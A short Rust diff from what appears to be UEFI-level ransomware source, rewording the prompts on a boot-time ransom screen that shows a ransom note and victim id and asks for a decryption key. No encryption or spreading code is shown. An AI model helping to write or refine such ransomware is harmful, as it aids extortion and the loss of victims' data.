@@ -41,7 +41,7 @@ fn init_ransom_screen(st: &mut SystemTable<Boot>, id: &str) -> uefi::Result {
         .write_str(include_str!("include/ransom_note.txt"))
         .unwrap();
     st.stdout().write_str(id).unwrap();
-    st.stdout().write_str("\n\nEnter key here\n> ").unwrap();
+    st.stdout().write_str("\n\nPlease enter your decryption key here\nKey> ").unwrap();
 
     Ok(())
 }
@@ -70,7 +70,7 @@ fn take_input(
                 );
             } else {
                 recover(&mut st, buffer.as_bytes()).unwrap();
-                stdout.write_str("\n> ").unwrap();
+                stdout.write_str("\nKey> ").unwrap();
                 buffer.clear();
             }
         }
